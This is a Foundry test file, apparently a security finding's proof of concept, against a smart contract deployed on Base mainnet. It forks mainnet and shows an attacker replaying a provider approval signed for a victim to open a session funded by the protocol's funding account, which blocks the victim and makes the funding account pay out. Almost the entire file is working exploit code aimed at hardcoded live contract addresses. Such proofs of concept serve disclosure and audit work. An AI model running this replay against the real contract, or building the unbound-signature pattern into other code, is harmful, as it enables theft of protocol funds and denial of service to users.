// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";

interface IMOR {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
}

interface IDiamond {
    function providerRegister(address, uint256, string calldata) external;
    function modelRegister(address, bytes32, bytes32, uint256, uint256, string calldata, string[] calldata) external;
    function getModelId(address, bytes32) external pure returns (bytes32);
    function postModelBid(address, bytes32, uint256) external returns (bytes32);
    function openSession(address, uint256, bool, bytes calldata, bytes calldata) external returns (bytes32);
    function claimForProvider(bytes32) external;
    function getIsProviderApprovalUsed(bytes calldata) external view returns (bool);
    function getSessionId(address, address, bytes32, uint256) external pure returns (bytes32);
}

/// @notice Candidate C-2: SessionRouter provider approval is not bound to the user in the
/// signed payload. An approval issued for `victim` can be consumed by `attacker` to open a
/// fundingAccount-paid (stipend mode) session; the victim's own openSession then reverts.
/// Fork: Base mainnet @ block 58505524. All actors are fresh test accounts; the provider is
/// a test account registered through the normal public flow (no privileged impersonation).
contract ApprovalReplayTest is Test {
    address constant DIAMOND = 0x6aBE1d282f72B474E54527D93b979A4f64d3030a;
    address constant MOR = 0x7431aDa8a591C955a994a21710752EF9b882b8e3;
    address constant FUNDING = 0x5160C0311A95E0A1072FA85Df23712A7BA1cD4b1;

    uint256 constant BLOCK = 58505524;
    uint256 constant PRICE = 1e13; // wei/sec, inside the live band [1e10, 1e16]
    uint256 constant ATTACK_STAKE = 10_000 ether; // MOR

    address provider;
    uint256 providerPk;
    address modelOwner;
    address victim;
    address attacker;
    bytes32 bidId;

    function _signApproval(bytes memory payload, uint256 pk) internal pure returns (bytes memory) {
        bytes32 hash = keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", keccak256(payload)));
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, hash);
        return abi.encodePacked(r, s, v);
    }

    function setUp() public {
        vm.createSelectFork("https://base-rpc.publicnode.com", BLOCK);
        (provider, providerPk) = makeAddrAndKey("provider");
        modelOwner = makeAddr("modelOwner");
        victim = makeAddr("victim");
        attacker = makeAddr("attacker");

        deal(MOR, provider, 200 ether);
        deal(MOR, modelOwner, 2 ether);
        deal(MOR, attacker, ATTACK_STAKE);
        deal(MOR, victim, 1_000 ether);

        // Provider registers with 100 MOR stake (min is 0.2 MOR).
        vm.startPrank(provider);
        IMOR(MOR).approve(DIAMOND, 200 ether);
        IDiamond(DIAMOND).providerRegister(provider, 100 ether, "https://provider.example");
        vm.stopPrank();

        // Model owner registers a model with 1 MOR stake (min is 0.1 MOR).
        bytes32 baseModelId = bytes32(uint256(12345));
        vm.startPrank(modelOwner);
        IMOR(MOR).approve(DIAMOND, 2 ether);
        string[] memory tags = new string[](0);
        IDiamond(DIAMOND).modelRegister(modelOwner, baseModelId, bytes32(uint256(999)), 0, 1 ether, "TestModel", tags);
        vm.stopPrank();
        bytes32 modelId = IDiamond(DIAMOND).getModelId(modelOwner, baseModelId);

        // Provider posts a bid (0.3 MOR bid fee is charged to the provider).
        vm.prank(provider);
        bidId = IDiamond(DIAMOND).postModelBid(provider, modelId, PRICE);
    }

    function testApprovalReplay() public {
        // Provider signs an approval naming the VICTIM as the intended user.
        bytes memory approval = abi.encode(bidId, block.chainid, victim, block.timestamp);
        bytes memory sig = _signApproval(approval, providerPk);

        uint256 fundingBefore = IMOR(MOR).balanceOf(FUNDING);
        console.log("fundingAccount MOR balance:", fundingBefore);

        // ATTACKER (a different, unprivileged address) consumes the victim's approval,
        // choosing stipend mode (isDirectPaymentFromUser_ = false) and their own stake.
        vm.startPrank(attacker);
        IMOR(MOR).approve(DIAMOND, ATTACK_STAKE);
        bytes32 sessionId = IDiamond(DIAMOND).openSession(attacker, ATTACK_STAKE, false, approval, sig);
        vm.stopPrank();

        assertTrue(IDiamond(DIAMOND).getIsProviderApprovalUsed(approval), "approval should be consumed");
        console.log("attacker opened session:", uint256(sessionId));

        // The victim's own attempt with their own approval now reverts (approval burned).
        vm.startPrank(victim);
        IMOR(MOR).approve(DIAMOND, 1_000 ether);
        vm.expectRevert();
        IDiamond(DIAMOND).openSession(victim, 1_000 ether, false, approval, sig);
        vm.stopPrank();
        console.log("victim openSession reverted as expected (approval consumed by attacker)");

        // Warp past the session end (duration is capped at maxSessionDuration = 7 days).
        vm.warp(block.timestamp + 8 days);

        uint256 providerBefore = IMOR(MOR).balanceOf(provider);
        vm.prank(provider);
        IDiamond(DIAMOND).claimForProvider(sessionId);
        uint256 providerGain = IMOR(MOR).balanceOf(provider) - providerBefore;
        uint256 fundingLoss = fundingBefore - IMOR(MOR).balanceOf(FUNDING);

        console.log("provider paid (MOR wei):", providerGain);
        console.log("fundingAccount loss (MOR wei):", fundingLoss);

        // The provider was paid for the ATTACKER's session out of the protocol funding account,
        // under an approval that named the victim. Expected: 7 days * 1e13 wei/s = 6.048 MOR.
        assertEq(fundingLoss, providerGain, "provider pay must come from fundingAccount");
        assertEq(providerGain, 604800 * PRICE, "expected 7-day session payout from fundingAccount");
    }
}
